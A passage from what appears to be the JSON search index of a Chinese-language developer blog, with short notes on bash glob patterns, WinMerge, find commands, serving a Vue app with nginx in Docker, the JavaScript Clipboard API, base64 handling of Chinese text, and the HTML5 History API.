","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:2","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"+(ab|def)+(.jpg|.gif) +(pattern-list)：匹配1個或以上的patterns ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:3","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"@(ab|def)@(.jpg|.gif) @(pattern-list)：只匹配1個pattern ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:4","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"!(ab|def)!(.jpg|.gif) !(pattern-list)：匹配任何與pattern不一樣的patterns ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:5","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"不知道為什麼.開頭抓不到? 這邊就不深入了 ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:6","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["Linux"],"content":"小記 一般我們使用 ()*+. 很容易連想正規表示式，但是其實是不一樣的，看到()前面號，會把他想成 regex {0,無限}，但其實是不一樣的。原範例是*(ab|def)**(.jpg|.gif)，你會看到**，但是其實就是 第一個 extglob，第二個是模式匹配，簡單來說誇號前面符號要注意。 ","date":"2021-08-22","objectID":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/:4:7","tags":["linux","bash","glob"],"title":"glob 搜尋匹配規則","uri":"/blog/posts/glob-%E6%90%9C%E5%B0%8B%E5%8C%B9%E9%85%8D%E8%A6%8F%E5%89%87/"},{"categories":["實用工具"],"content":"因為工作需求要專案檔案差異清單，要怎麼快速整理清單真的讓我想了一下。最後發現 Winmerge 就能做到簡單程式差異比對。 ","date":"2021-07-24","objectID":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/:0:0","tags":["diff","compare","winmerge"],"title":"Winmerge 比對技巧筆記","uri":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"tree mode merge - Get recursive list of different files in Winmerge (without folder tree/structure) - Super User 可以方便複製檔案清單。可跳過上層資料夾資料。 ","date":"2021-07-24","objectID":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/:1:0","tags":["diff","compare","winmerge"],"title":"Winmerge 比對技巧筆記","uri":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"開啟/關閉 顯示相同相目,顯示差異項目 選擇「顯示相同項目」後，原本綠色的圖標會顯示/隱藏。這樣看檔案(附製檔案也很方便)。 顯示差異項目也是跟上面差不多。 ","date":"2021-07-24","objectID":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/:2:0","tags":["diff","compare","winmerge"],"title":"Winmerge 比對技巧筆記","uri":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"command line 未使用。 Command line - WinMerge 2.16 Manual ","date":"2021-07-24","objectID":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/:3:0","tags":["diff","compare","winmerge"],"title":"Winmerge 比對技巧筆記","uri":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"filter GUI 可以選擇要抓到項目。 WinMerge: How to exclude *.bak and *.tmp files? - Super User Using Filters - WinMerge 2.16 Manual ","date":"2021-07-24","objectID":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/:4:0","tags":["diff","compare","winmerge"],"title":"Winmerge 比對技巧筆記","uri":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/"},{"categories":["實用工具"],"content":"離題: Git(比較大法) Git 小技巧 - 產生從零開始的 git diff 報告-黑暗執行緒 ","date":"2021-07-24","objectID":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/:5:0","tags":["diff","compare","winmerge"],"title":"Winmerge 比對技巧筆記","uri":"/blog/posts/Winmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"快速查詢多個檔案方法 簡單小記 ","date":"2021-07-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:0:0","tags":["linux"],"title":"快速查詢多個檔案方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"find 查詢大法 find */ -regex '.*UZ29564846.*\\|.*UZ02104919.*\\|.*UZ02605231.*\\|.*UZ02771129.*\\|.*UZ03128013.*\\|.*UZ03645989.*\\|.*UZ04195564.*\\|.*UZ04258665.*\\|.*UZ04572090.*\\|.*UZ04582332.*\\|.*UZ04795657.*\\|.*UZ04795658.*\\|.*UZ04805060.*\\|.*UZ04906998.*\\|.*UZ05422771.*\\|.*UZ05959297.*\\|.*UZ06513505.*\\|.*UZ06513808.*\\|.*UZ06557497.*\\|.*UZ06627631.*\\|.*UZ06844457.*\\|.*UZ06858381.*\\|.*UZ07690050.*\\|.*UZ07745374.*\\|.*UZ07973794.*\\|.*UZ08481252.*\\|.*UZ08483243.*\\|.*UZ08994865.*\\|.*UZ09219703.*\\|.*UZ09617909.*\\|.*UZ09744363.*\\|.*UZ10085340.*\\|.*UZ10147439.*\\|.*UZ10265614.*\\|.*UZ10349030.*\\|.*UZ11080689.*\\|.*UZ11113319.*\\|.*UZ11239587.*\\|.*UZ11340496.*\\|.*UZ11358240.*\\|.*UZ11369419.*\\|.*UZ11574001.*\\|.*UZ13383394.*\\|.*UZ12044029.*\\|.*UZ12052655.*\\|.*UZ12305719.*\\|.*UZ13379585.*\\|.*UZ12380320.*\\|.*UZ12512884.*\\|.*UZ13031886.*\\|.*UZ13178378.*\\|.*UZ13221862.*\\|.*UZ12812003.*\\|.*UZ12897804.*\\|.*UZ13218549.*\\|.*UZ13219157.*\\|.*UZ13740815.*\\|.*UZ13740852.*\\|.*UZ13813311.*\\|.*UZ13971437.*\\|.*UZ13991424.*\\|.*UZ14256642.*\\|.*UZ14325289.*\\|.*UZ14450802.*\\|.*UZ14490320.*\\|.*UZ14610042.*\\|.*UZ14629788.*\\|.*UZ14676668.*\\|.*UZ14725354.*\\|.*UZ14781828.*\\|.*UZ14847205.*\\|.*UZ15257774.*\\|.*UZ15368931.*\\|.*UZ15508841.*\\|.*UZ15715055.*\\|.*UZ16018567.*\\|.*UZ16265337.*\\|.*UZ16390441.*\\|.*UZ16515932.*\\|.*UZ16624108.*\\|.*UZ16746539.*\\|.*UZ17064104.*\\|.*UZ17324547.*\\|.*UZ17336391.*\\|.*UZ20836990.*\\|.*UZ22806918.*\\|.*UZ23183708.*\\|.*UZ24312875.*\\|.*UZ24380058.*\\|.*UZ24602016.*' regex match either string in linux “find” command - Stack Overflow 之前就有記錄相關 find 指令，但每次都忘了差不多怎麼用…，不過有整理筆記的好處，可以方便找出來。 ","date":"2021-07-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:1:0","tags":["linux"],"title":"快速查詢多個檔案方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"globstar 大法 跟find 差不多…，但好像也沒有比較方便。 ","date":"2021-07-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:2:0","tags":["linux"],"title":"快速查詢多個檔案方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"直接找 zip 檔案內容 Linux find 實用指令筆記 | 程式狂想筆記 linux bash / shell 有關 * 星號的事情 | 程式狂想筆記 How can I view the contents of tar.gz file without extracting from the command-line? - Ask Ubuntu linux - How to find the string in the list of .gz files? - Unix \u0026 Linux Stack Exchange 查詢有壓縮(gz)日誌 log 方法 | 程式狂想筆記 https://ideone.com/7nbElh ","date":"2021-07-24","objectID":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:3:0","tags":["linux"],"title":"快速查詢多個檔案方法","uri":"/blog/posts/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Docker"],"content":"簡單用 Docker 部屬前端程式 nginx 之前這篇Vue Router 4 學習筆記 | 程式狂想筆記有記錄到要怎麼使用 nginx，今天就簡單實作看看。 ","date":"2021-07-24","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/:0:0","tags":["docker","nginx","fronted"],"title":"簡單用 Docker 部屬前端程式 nginx","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/"},{"categories":["Docker"],"content":"取得 nginx.conf 設定檔 可參考:Nginx - Official Image | Docker Hub docker run --name tmp-nginx-container -d nginx docker cp tmp-nginx-container:/etc/nginx/nginx.conf /host/path/nginx.conf docker rm -f tmp-nginx-container 我以前有有寫過抓出 Docker 裡面檔案設定檔出來 | 程式狂想筆記，但久久沒用就忘記差不多… ","date":"2021-07-24","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/:1:0","tags":["docker","nginx","fronted"],"title":"簡單用 Docker 部屬前端程式 nginx","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/"},{"categories":["Docker"],"content":"前端設定 加在 nginx.conf 上面。 location / { try_files $uri $uri/ /index.html; } 要補上 server ，要放在 http 裡面。 server{ listen 80; location / { root /usr/share/nginx/html; try_files $uri $uri/ /index.html; } } 參考:不同的历史模式 | Vue Router ","date":"2021-07-24","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/:2:0","tags":["docker","nginx","fronted"],"title":"簡單用 Docker 部屬前端程式 nginx","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/"},{"categories":["Docker"],"content":"Docker volume 掛載設定 docker run --rm -v $(pwd)/dist:/usr/share/nginx/html:ro -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf:ro -p 3355:80 nginx 可以跑的話再設定 nginx 基礎設定教學 ","date":"2021-07-24","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/:3:0","tags":["docker","nginx","fronted"],"title":"簡單用 Docker 部屬前端程式 nginx","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/"},{"categories":["Docker"],"content":"設定 docker-compose 加上 traefik 設定 version: \"2\" services: strTemplateTest: image: nginx volumes: - ./dist/:/usr/share/nginx/html - ./nginx.conf:/etc/nginx/nginx.conf - /etc/localtime:/etc/localtime:ro networks: - traefik_network restart: always labels: - \"traefik.http.routers.strTemplateTest.rule=Host(`strTemplateTest.xxxx.org`)\" - \"traefik.http.routers.strTemplateTest.tls=true\" networks: traefik_network: external: true ","date":"2021-07-24","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/:4:0","tags":["docker","nginx","fronted"],"title":"簡單用 Docker 部屬前端程式 nginx","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/"},{"categories":["Docker"],"content":"之後… 之後研究 Drone CI 會研究怎麼 build dockerfile，然後自動化部屬。之後再說，顆顆。 ","date":"2021-07-24","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/:5:0","tags":["docker","nginx","fronted"],"title":"簡單用 Docker 部屬前端程式 nginx","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx/"},{"categories":["Web"],"content":"網頁複製文字研究整理 常用這個功能，我都網路 Google 找解答，今天又去爬了一次，就順便整理一下。 ","date":"2021-07-24","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/:0:0","tags":["web"],"title":"網頁複製文字研究整理","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/"},{"categories":["Web"],"content":"以前常用寫法 前端開發：如何使用Javascript實現複製到剪貼簿的功能 - Astral Web 歐斯瑞有限公司 function copyText() { var node = document.getElementById(\"text\"); if (document.body.createTextRange) { var range = document.body.createTextRange(); range.moveToElementText(node); range.select(); document.execCommand(\"copy\"); alert(\"複製成功!\"); } else if (window.getSelection) { var selection = window.getSelection(); var range = document.createRange(); range.selectNodeContents(node); selection.removeAllRanges(); selection.addRange(range); document.execCommand(\"copy\"); alert(\"複製成功!\"); } else { alert('無法複製內容、瀏覽器不支援'); } } 自動選取某個區域的文字 - OXXO.STUDIO ","date":"2021-07-24","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/:1:0","tags":["web"],"title":"網頁複製文字研究整理","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/"},{"categories":["Web"],"content":"Clipboard API How do I copy to the clipboard in JavaScript? - Stack Overflow，這篇有很多留實做方法，這邊有看到有人用到 HTML5 Clipboard API。 var text = \"Example text to appear on clipboard\"; navigator.clipboard.writeText(text).then(function() { console.log('Async: Copying to clipboard was successful!'); }, function(err) { console.error('Async: Could not copy text: ', err); }); 注意，這邊不能在 console.log 下，因為會無效。(原因:Clipboard write was blocked due to lack of user activation.)，需要使用者操做才能有效。 Clipboard API 實做測試 Clipboard Test ","date":"2021-07-24","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/:2:0","tags":["web"],"title":"網頁複製文字研究整理","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/"},{"categories":["Web"],"content":"復製圖片法 Unblocking clipboard access這篇有教，但先不研究。目前知道Firefox 貼上只能用在文字上面，圖片目前還不行。 Async Clipboard API Image Demo ","date":"2021-07-24","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/:2:1","tags":["web"],"title":"網頁複製文字研究整理","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/"},{"categories":["Web"],"content":"相關 API 文件 Clipboard.writeText() - Web APIs | MDN 複製用的。 Permissions API - Web APIs | MDN，權限控制。 TextRange - Web APIs | MDN 以廢棄，不推薦使用 Selection - Web APIs | MDN，這個是框選用的API。仔細看發現還滿簡單的。 var selObj = window.getSelection(); var range = selObj.getRangeAt(0); ","date":"2021-07-24","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/:3:0","tags":["web"],"title":"網頁複製文字研究整理","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86/"},{"categories":["JavaScript"],"content":"JavaScript atob 轉 base64時候處理中文方法 我以前一直以為轉 base64 一定都要透過套件來完成，但某一年我看到 JS 也能直接轉 base64(用atob)，我一直以為很完美，直到我今天轉到中文就轉不過了… ","date":"2021-07-24","objectID":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/:0:0","tags":["javascript","base64"],"title":"JavaScript atob 轉 base64時候處理中文方法","uri":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"開門見山，直接整理網路上解法 JavaScript atob / btoa 編解碼不支援 utf8 的解決方案 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 解決 Javascript 中 atob 方法解碼中文字符亂碼問題 - CODING 博客 btoa(), atob() 支援中文的方法 | Liullen dev daily 原来浏览器原生支持JS Base64编码解码 « 张鑫旭-鑫空间-鑫生活 ","date":"2021-07-24","objectID":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/:1:0","tags":["javascript","base64"],"title":"JavaScript atob 轉 base64時候處理中文方法","uri":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"atob/btoa??? 由於一些網絡通訊協議的限制,你必須使用 window.btoa() 方法對原數據進行編碼後，才能進行發送。接收方使用相當於 window.atob() 的方法對接受到的 base64 數據進行解碼,得到原數據。例如，發送某些含有 ASCII 碼表中 0 到 31 之間的控制字符的數據。 參考:解決 Javascript 中 atob 方法解碼中文字符亂碼問題 - CODING 博客 记住btoa方法 btoa这个方法名称乍一看，很奇怪，不知道这个单词什么意思。我们可以理解为 B to A，也就是从B到A。那B指什么，A指什么呢？和atob方法一样，B指的是low B普通字符串，A指的是Base64字符。 因此，btoa方法表示low B普通字符to Base64字符，也就是Base64编码。 參考:原来浏览器原生支持JS Base64编码解码 « 张鑫旭-鑫空间-鑫生活 我一直看不太懂 function 為什麼取這樣…. ","date":"2021-07-24","objectID":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/:1:1","tags":["javascript","base64"],"title":"JavaScript atob 轉 base64時候處理中文方法","uri":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"encodeURIComponent function utf8_to_b64( str ) { return window.btoa(encodeURIComponent( escape( str ))); } function b64_to_utf8( str ) { return unescape(decodeURIComponent(window.atob( str ))); } 雖然有猜到會用 encodeURIComponent，之前 fabar.js 有用到這個處理中文，但是沒有想到 escape / unescape ，這邊不知道有甚麼作用。前端串前端推薦使用，但不是和對外接口或是後湍操作，測試結果會比較長。 Base64 encode/decode online網站測試無法解 ","date":"2021-07-24","objectID":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/:1:2","tags":["javascript","base64"],"title":"JavaScript atob 轉 base64時候處理中文方法","uri":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"第三方套件 Javascript base64 - Javascript tutorial with example source code Base64 encode/decode online網站測試可以解 上面 ESM 會有問題，所以我改用dankogai/js-base64: Base64 implementation for JavaScript ","date":"2021-07-24","objectID":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/:1:3","tags":["javascript","base64"],"title":"JavaScript atob 轉 base64時候處理中文方法","uri":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"MDN 解法 // convert a Unicode string to a string in which // each 16-bit unit occupies only one byte function toBinary(string) { const codeUnits = new Uint16Array(string.length); for (let i = 0; i \u003c codeUnits.length; i++) { codeUnits[i] = string.charCodeAt(i); } return String.fromCharCode(...new Uint8Array(codeUnits.buffer)); } // a string that contains characters occupying \u003e 1 byte const myString = \"☸☹☺☻☼☾☿\"; const converted = toBinary(myString); const encoded = btoa(converted); console.log(encoded); // OCY5JjomOyY8Jj4mPyY= Base64 encode/decode online網站測試可以解 ","date":"2021-07-24","objectID":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/:1:4","tags":["javascript","base64"],"title":"JavaScript atob 轉 base64時候處理中文方法","uri":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"總結 自己用的話可以看用哪一個，但對外串接還是用 第三方套件，後端串才不會有問題。 ","date":"2021-07-24","objectID":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/:2:0","tags":["javascript","base64"],"title":"JavaScript atob 轉 base64時候處理中文方法","uri":"/blog/posts/JavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95/"},{"categories":["HTML"],"content":"參考:操控瀏覽器歷史紀錄 - Web APIs | MDN ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:0:0","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"上/下一頁API 往前往後歷史紀錄可以用 back(), forward(), 和 go() 的方法。 window.history.back(); window.history.forward(); ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:0:1","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"移置特定頁面 移動到特定的歷史紀錄 你可以用 go() 方法來從頁面的 session history 紀錄中載入特定紀錄，以目前頁面的相對位置而定（目前的頁面想當然爾是 index 0）。 window.history.go(-1); window.history.go(1); ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:0:2","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"其它 var numberOfEntries = window.history.length; ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:0:3","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"加入和修改歷史紀錄 ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:1:0","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"pushState() 方法範例 var stateObj = { foo: \"bar\" }; history.pushState(stateObj, \"page 2\", \"bar.html\"); ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:1:1","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"replaceState() 方法 var stateObj = { foo: \"bar\" }; history.replaceState(stateObj, \"page 2\", \"bar.html\"); ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:1:2","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"popstate 事件 window.onpopstate = function(event) { alert(\"location: \" + document.location + \", state: \" + JSON.stringify(event.state)); }; history.pushState({page: 1}, \"title 1\", \"?page=1\"); history.pushState({page: 2}, \"title 2\", \"?page=2\"); history.replaceState({page: 3}, \"title 3\", \"?page=3\"); history.back(); // alerts \"location: http://example.com/example.html?page=1, state: {\"page\":1}\" history.back(); // alerts \"location: http://example.com/example.html, state: null history.go(2); // alerts \"location: http://example.com/example.html?page=3, state: {\"page\":3} 這邊可以看到，第一頁面，state是null，replaceState跟 location.replace 很像，上下一頁不會取代掉 ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:1:3","tags":["html5","history"],"title":"HTML5 History API 筆記","uri":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/"},{"categories":["HTML"],"content":"小記 一開始我以為 HTML5 History API 很難，但是看 popstate 事件，我就恍然大悟，大概知道要怎麼使用。簡單來說跟location.href 很像，但可以帶 state和 改變 URL。透過popstate 事件 去操作畫面。 這邊看到還滿有趣的範例:重新認識 JavaScript 番外篇 (2) - 你所不知道的 pushState - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2021-07-24","objectID":"/blog/posts/HTML5-History-API-%E7%AD%86%E8%A8%98/:2:0","tags":["html5","history"],"title":"HTML5 History API 